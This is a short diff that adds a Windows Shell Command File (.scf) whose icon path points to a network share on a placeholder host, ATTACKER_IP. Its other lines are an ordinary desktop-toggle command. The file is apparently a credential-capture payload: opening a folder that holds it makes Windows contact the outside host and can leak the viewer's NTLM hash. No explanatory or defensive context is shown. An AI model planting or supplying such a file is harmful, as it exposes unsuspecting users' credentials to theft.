@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\ATTACKER_IP\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
